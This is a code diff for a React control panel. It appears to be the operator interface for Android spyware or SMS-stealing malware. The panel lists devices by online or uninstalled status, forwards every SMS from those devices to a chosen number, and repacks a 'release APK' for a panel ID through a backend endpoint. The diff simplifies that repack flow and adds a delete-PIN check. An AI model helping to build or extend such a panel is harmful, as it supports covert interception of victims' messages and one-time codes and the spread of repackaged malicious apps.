@@ -245,7 +245,6 @@ function GroupCard({ deviceId, items, onDeviceClick, dark, deviceNumMap }: {
   );
 }
 
-// ─── Device Card ──────────────────────────────────────────────────────────────
 function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline, dark, isUninstalled, isFavorite, onToggleFavorite }: {
   device: AnyRecord; displayNum: number;
   onCheckOnline: (id: string) => void;
@@ -307,7 +306,6 @@ function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline,
       }`}
       onClick={() => onOpen(did)}
     >
-      {/* Header: number + name + star */}
       <div className="mb-2 flex items-center justify-between gap-1">
         <span className={`truncate text-[13px] font-bold ${isUninstalled ? "text-red-500" : D.deviceText(dark)}`}>
           {displayNum}. {brand}{model ? ` (${model})` : ""}
@@ -323,7 +321,6 @@ function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline,
         </button>
       </div>
 
-      {/* Inner bordered rows */}
       <div className={`overflow-hidden rounded-lg border ${
         isUninstalled
           ? (dark ? "border-red-800" : "border-red-200")
@@ -425,7 +422,6 @@ function CehBanner({ dark }: { dark: boolean }) {
   );
 }
 
-// ─── Settings Input ───────────────────────────────────────────────────────────
 function SettingsInput({ label, hint, type = "text", value, onChange, inputMode, readOnly }: {
   label: string; hint?: string; type?: string; value: string;
   onChange: (v: string) => void; inputMode?: any; readOnly?: boolean;
@@ -462,8 +458,8 @@ export default function MainPage() {
   const [pinNew,        setPinNew]        = useState("");
   const [pinConfirm,    setPinConfirm]    = useState("");
   const [pinMsg,        setPinMsg]        = useState("");
+  const [pinIsSet,      setPinIsSet]      = useState<boolean | null>(null); // null = loading
 
-  // APK Info state
   const [licenseInfo, setLicenseInfo] = useState<any>(null);
   const [contactOpen, setContactOpen] = useState(false);
 
@@ -474,7 +470,7 @@ export default function MainPage() {
   useEffect(() => {
     if ((location.state as any)?.openSettings) {
       setHelpScreen("settings");
-      loadGlobalPhone();
+      loadSettingsData();
     }
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
@@ -500,13 +496,10 @@ export default function MainPage() {
   const [loadingGroups,  setLoadingGroups]  = useState(false);
   const groupsLoadedRef = useRef(false);
 
-  // ── Favorites ────────────────────────────────────────────────────────────
   const [favoritesMap, setFavoritesMap] = useState<Record<string, boolean>>({});
 
-  // ── Fix APK ──────────────────────────────────────────────────────────────
-  const [fixFileId,   setFixFileId]   = useState("");
+  // ── Fix APK (no fileId / token — backend looks up from Panel model) ───────
   const [fixPanelId,  setFixPanelId]  = useState("");
-  const [fixToken,    setFixToken]    = useState("");
   const [fixPhase,    setFixPhase]    = useState<FixPhase>("idle");
   const [fixReqId,    setFixReqId]    = useState("");
   const [fixError,    setFixError]    = useState("");
@@ -661,7 +654,6 @@ export default function MainPage() {
             );
           }
           if (event === "device:upsert" && msg.data && did) {
-            // New device — add to order ref and prepend
             if (!deviceOrderRef.current.includes(did)) {
               deviceOrderRef.current = [did, ...deviceOrderRef.current];
             }
@@ -743,7 +735,7 @@ export default function MainPage() {
     } catch {}
   }, []);
 
-  const openDevice  = useCallback((id: string) => { if (id) nav(`/devices/${encodeURIComponent(id)}`); }, [nav]);
+  const openDevice      = useCallback((id: string) => { if (id) nav(`/devices/${encodeURIComponent(id)}`); }, [nav]);
   const closeCheckAlert = useCallback(() => { if (checkTimerRef.current) clearTimeout(checkTimerRef.current); setCheckAlert(null); }, []);
   const commitSearch    = useCallback(() => { setSearchQ(search.trim().toLowerCase()); }, [search]);
 
@@ -764,9 +756,7 @@ export default function MainPage() {
   // ── Fix APK ───────────────────────────────────────────────────────────────
   function openFixApk() {
     setHelpOpen(false);
-    setFixFileId("");
     setFixPanelId(str(ENV.PANEL_ID || ""));
-    setFixToken("");
     setFixPhase("idle");
     setFixError("");
     setFixReqId("");
@@ -780,14 +770,14 @@ export default function MainPage() {
   }
 
   async function startFixApk() {
-    const fileId = fixFileId.trim();
-    if (!fileId) { setFixError("APK Telegram File ID daalna zaroori hai"); return; }
+    const panelId = fixPanelId.trim();
+    if (!panelId) { setFixError("Panel ID required hai"); return; }
     setFixPhase("starting");
     setFixError("");
     try {
       const r = await axios.post(
         `${ENV.API_BASE}/api/admin/repack/start`,
-        { fileId, panelId: fixPanelId.trim(), token: fixToken.trim() },
+        { panelId },
         { headers: apiHeaders(), timeout: 30000 }
       );
       const reqId = String(r.data?.requestId || "");
@@ -801,14 +791,13 @@ export default function MainPage() {
             `${ENV.API_BASE}/api/admin/repack/${reqId}/status`,
             { headers: apiHeaders(), timeout: 10000 }
           );
-          const { status, filename, error } = s.data;
-          if (status === "done") {
+          if (s.data.status === "done") {
             clearInterval(fixPollRef.current!); fixPollRef.current = null;
-            setFixFilename(filename || "repacked.apk");
+            setFixFilename(s.data.filename || "repacked.apk");
             setFixPhase("done");
-          } else if (status === "error") {
+          } else if (s.data.status === "error") {
             clearInterval(fixPollRef.current!); fixPollRef.current = null;
-            setFixError(error || "Repack fail ho gaya");
+            setFixError(s.data.error || "Repack fail ho gaya");
             setFixPhase("error");
           }
         } catch {}
@@ -835,7 +824,7 @@ export default function MainPage() {
     }
   }
 
-  // ── Help helpers ──────────────────────────────────────────────────────────
+  // ── Help / Settings helpers ───────────────────────────────────────────────
   function handleLogout() { setHelpOpen(false); logout(); }
 
   function _openLink(url: string) {
@@ -875,6 +864,18 @@ export default function MainPage() {
     } catch {}
   }
 
+  async function loadPinStatus() {
+    try {
+      const r = await fetch(`${ENV.API_BASE}/api/admin/deletePassword/status`, { headers: apiHeaders() });
+      const d = await r.json();
+      setPinIsSet(d?.isSet === true);
+    } catch { setPinIsSet(null); }
+  }
+
+  async function loadSettingsData() {
+    await Promise.all([loadGlobalPhone(), loadPinStatus()]);
+  }
+
   async function saveGlobalPhone() {
     setGlobalLoading(true); setGlobalMsg("");
     try {
@@ -888,14 +889,24 @@ export default function MainPage() {
 
   async function changePin() {
     setPinMsg("");
-    if (!pinOld || !pinNew) { setPinMsg("❌ All fields required"); return; }
+    // Agar PIN set hai toh old PIN zaroori hai
+    if (pinIsSet === true && !pinOld) { setPinMsg("❌ Old PIN required"); return; }
+    if (!pinNew)               { setPinMsg("❌ New PIN required"); return; }
     if (pinNew !== pinConfirm) { setPinMsg("❌ PINs don't match"); return; }
-    if (pinNew.length < 4) { setPinMsg("❌ Min 4 digits"); return; }
+    if (pinNew.length < 4)     { setPinMsg("❌ Min 4 digits"); return; }
     try {
-      const r = await axios.post(`${ENV.API_BASE}/api/admin/deletePassword/change`,
-        { currentPassword: pinOld, newPassword: pinNew }, { headers: apiHeaders() });
-      if (r.data?.success) { setPinMsg("✅ PIN changed!"); setPinOld(""); setPinNew(""); setPinConfirm(""); }
-      else setPinMsg("❌ " + (r.data?.error || "Failed"));
+      const r = await axios.post(
+        `${ENV.API_BASE}/api/admin/deletePassword/change`,
+        { currentPassword: pinOld, newPassword: pinNew },
+        { headers: apiHeaders() }
+      );
+      if (r.data?.success) {
+        setPinMsg("✅ PIN " + (pinIsSet ? "changed!" : "set!"));
+        setPinOld(""); setPinNew(""); setPinConfirm("");
+        setPinIsSet(true);
+      } else {
+        setPinMsg("❌ " + (r.data?.error || "Failed"));
+      }
     } catch (e: any) { setPinMsg("❌ " + (e?.response?.data?.error || "Failed")); }
   }
 
@@ -996,7 +1007,6 @@ export default function MainPage() {
   const DEVICE_OPTS = [{ value: "latest", label: "Latest" }, { value: "old2new", label: "Old 2 New" }];
   const isLoading   = loadingForms || loadingSms;
 
-  // ── Render ────────────────────────────────────────────────────────────────
   return (
     <div className={`min-h-screen ${D.page(dark)}`}>
       <CehBanner dark={dark} />
@@ -1115,7 +1125,7 @@ export default function MainPage() {
               {[
                 { label: "Fix APK",  icon: "🔧", onClick: openFixApk },
                 { label: "APK Info", icon: "📦", onClick: () => { setHelpOpen(false); setHelpScreen("apk"); loadLicenseInfo(); } },
-                { label: "Settings", icon: "⚙️", onClick: () => { setHelpOpen(false); setHelpScreen("settings"); loadGlobalPhone(); } },
+                { label: "Settings", icon: "⚙️", onClick: () => { setHelpOpen(false); setHelpScreen("settings"); loadSettingsData(); } },
                 { label: "Logout",   icon: "🚪", onClick: handleLogout },
               ].map((item) => (
                 <button key={item.label} type="button" onClick={item.onClick}
@@ -1142,7 +1152,7 @@ export default function MainPage() {
         </div>
       )}
 
-      {/* CONTACT POPUP — "Contact Harmfull Team" removed */}
+      {/* CONTACT POPUP */}
       {contactOpen && (
         <div className="fixed inset-0 z-[1001] flex items-end justify-center bg-black/40" onClick={() => setContactOpen(false)}>
           <div className="w-full rounded-t-2xl bg-white px-5 pt-5 pb-8" onClick={(e) => e.stopPropagation()}>
@@ -1164,7 +1174,6 @@ export default function MainPage() {
       {/* SETTINGS SCREEN */}
       {helpScreen === "settings" && (
         <div className="fixed inset-0 z-[1000] overflow-auto bg-[#f2f2f7]">
-          {/* Header */}
           <div className="sticky top-0 z-10 flex items-center gap-3 border-b border-gray-200 bg-white px-4 py-3 shadow-sm">
             <button type="button" onClick={() => setHelpScreen("")}
               className="flex h-8 w-8 items-center justify-center rounded-full bg-gray-100 text-[18px] text-gray-600">←</button>
@@ -1173,7 +1182,7 @@ export default function MainPage() {
 
           <div className="mx-auto max-w-[480px] space-y-3 p-4">
 
-            {/* SMS Forwarding Card */}
+            {/* SMS Forwarding */}
             <div className="rounded-2xl bg-white shadow-sm overflow-hidden">
               <div className="px-5 pt-5 pb-2">
                 <div className="flex items-center gap-2 mb-1">
@@ -1181,8 +1190,6 @@ export default function MainPage() {
                   <span className="text-[15px] font-bold text-gray-900">Auto SMS Forwarding</span>
                 </div>
                 <p className="text-[12px] text-gray-400 mb-4">Sabhi SMS automatically ek number pe forward hote hain</p>
-
-                {/* Toggle row */}
                 <div className="flex items-center justify-between mb-5 p-3 rounded-xl bg-gray-50 border border-gray-100">
                   <div>
                     <div className="text-[13px] font-semibold text-gray-700">Forwarding</div>
@@ -1196,7 +1203,6 @@ export default function MainPage() {
                     <span className={`absolute top-1 h-6 w-6 rounded-full bg-white shadow transition-transform duration-200 ${globalEnabled ? "translate-x-7" : "translate-x-1"}`} />
                   </button>
                 </div>
-
                 <SettingsInput
                   label="Forward Number"
                   hint="Jis number pe SMS bhejne hain (with country code)"
@@ -1214,23 +1220,39 @@ export default function MainPage() {
               </div>
             </div>
 
-            {/* Change PIN Card */}
+            {/* Change / Set PIN */}
             <div className="rounded-2xl bg-white shadow-sm overflow-hidden">
               <div className="px-5 pt-5 pb-2">
                 <div className="flex items-center gap-2 mb-1">
                   <span className="text-[18px]">🔐</span>
-                  <span className="text-[15px] font-bold text-gray-900">Change PIN</span>
+                  <span className="text-[15px] font-bold text-gray-900">
+                    {pinIsSet === false ? "Set PIN" : "Change PIN"}
+                  </span>
                 </div>
-                <p className="text-[12px] text-gray-400 mb-4">Panel access PIN badlo</p>
+                <p className="text-[12px] text-gray-400 mb-4">
+                  {pinIsSet === false
+                    ? "Pehli baar PIN set karo — delete confirmation ke liye use hota hai"
+                    : "Panel delete PIN badlo"}
+                </p>
 
-                <SettingsInput label="Old PIN"     value={pinOld}     onChange={setPinOld}     type="password" inputMode="numeric" />
+                {/* Old PIN — sirf tab dikhao jab PIN pehle se set ho */}
+                {pinIsSet !== false && (
+                  <SettingsInput
+                    label="Old PIN"
+                    hint={pinIsSet === null ? "Loading…" : undefined}
+                    value={pinOld}
+                    onChange={setPinOld}
+                    type="password"
+                    inputMode="numeric"
+                  />
+                )}
                 <SettingsInput label="New PIN"     value={pinNew}     onChange={setPinNew}     type="password" inputMode="numeric" />
                 <SettingsInput label="Confirm PIN" value={pinConfirm} onChange={setPinConfirm} type="password" inputMode="numeric" />
               </div>
               <div className="px-5 pb-5">
                 <button type="button" onClick={changePin}
                   className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white active:scale-[0.98]">
-                  Change PIN
+                  {pinIsSet === false ? "Set PIN" : "Change PIN"}
                 </button>
                 {pinMsg && <div className="mt-2 text-center text-[13px] font-medium">{pinMsg}</div>}
               </div>
@@ -1282,45 +1304,30 @@ export default function MainPage() {
 
           <div className="mx-auto max-w-[480px] space-y-3 p-4">
 
-            {/* Instructions */}
             <div className="rounded-2xl border border-blue-100 bg-blue-50 p-4">
               <div className="flex items-start gap-2">
                 <span className="text-[20px]">ℹ️</span>
                 <div>
-                  <div className="text-[13px] font-bold text-blue-800 mb-1">Kaise kare?</div>
+                  <div className="text-[13px] font-bold text-blue-800 mb-1">Kaise kaam karta hai?</div>
                   <div className="text-[12px] text-blue-700 leading-5">
-                    1. Apna release APK Telegram bot pe bhejo<br/>
-                    2. Bot se mila <strong>File ID</strong> neeche paste karo<br/>
-                    3. Panel ID aur Token fill karo<br/>
-                    4. "Start Repack" dabao — repack hone ke baad download karo
+                    Panel ID already fill hai (auto). Bas <strong>Request Fix</strong> dabao — 
+                    system automatically aapki latest release APK dhundh ke repack karega 
+                    aur yahan download link dega.
                   </div>
                 </div>
               </div>
             </div>
 
-            {/* Form Card */}
             <div className="rounded-2xl bg-white shadow-sm overflow-hidden">
               <div className="px-5 pt-5 pb-2">
                 <SettingsInput
-                  label="APK Telegram File ID"
-                  hint="Telegram bot pe APK bhejo → file_id copy karo"
-                  value={fixFileId}
-                  onChange={setFixFileId}
-                />
-                <SettingsInput
                   label="Panel ID"
+                  hint="Is panel ID ki release APK automatically fix hogi"
                   value={fixPanelId}
                   onChange={setFixPanelId}
                 />
-                <SettingsInput
-                  label="Token / API Key"
-                  hint="Optional — custom token embed karna ho toh"
-                  value={fixToken}
-                  onChange={setFixToken}
-                />
               </div>
 
-              {/* Status banners */}
               {fixPhase === "starting" && (
                 <div className="mx-5 mb-4 rounded-xl bg-blue-50 border border-blue-100 p-3 text-center">
                   <div className="animate-pulse text-[13px] font-semibold text-blue-700">🔄 Request bheji ja rahi hai…</div>
@@ -1334,7 +1341,7 @@ export default function MainPage() {
               )}
               {fixPhase === "done" && (
                 <div className="mx-5 mb-4 rounded-xl bg-green-50 border border-green-100 p-3 text-center">
-                  <div className="text-[14px] font-bold text-green-700">✅ Repack complete!</div>
+                  <div className="text-[14px] font-bold text-green-700">✅ APK Ready!</div>
                   <div className="text-[11px] text-green-600 mt-0.5">{fixFilename}</div>
                 </div>
               )}
@@ -1344,7 +1351,6 @@ export default function MainPage() {
                 </div>
               )}
 
-              {/* Action buttons */}
               <div className="px-5 pb-5 space-y-2">
                 {fixPhase === "done" ? (
                   <>
@@ -1353,9 +1359,9 @@ export default function MainPage() {
                       ⬇️ Download Fixed APK
                     </button>
                     <button type="button"
-                      onClick={() => { setFixPhase("idle"); setFixFileId(""); setFixError(""); setFixReqId(""); }}
+                      onClick={() => { setFixPhase("idle"); setFixError(""); setFixReqId(""); }}
                       className="w-full rounded-xl border border-gray-200 bg-gray-50 py-2.5 text-[13px] font-semibold text-gray-600">
-                      Naya APK Fix Karo
+                      Dobara Fix Karo
                     </button>
                   </>
                 ) : (
@@ -1363,10 +1369,10 @@ export default function MainPage() {
                     onClick={fixPhase === "idle" || fixPhase === "error" ? startFixApk : undefined}
                     disabled={fixPhase === "starting" || fixPhase === "repacking"}
                     className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white disabled:opacity-50 active:scale-[0.98]">
-                    {fixPhase === "starting"  ? "Bhej raha hai…"
+                    {fixPhase === "starting"   ? "Bhej raha hai…"
                       : fixPhase === "repacking" ? "Repack chal raha hai…"
                       : fixPhase === "error"     ? "Dobara Try Karo"
-                      : "Start Repack"}
+                      : "🔧 Request Fix"}
                   </button>
                 )}
               </div>
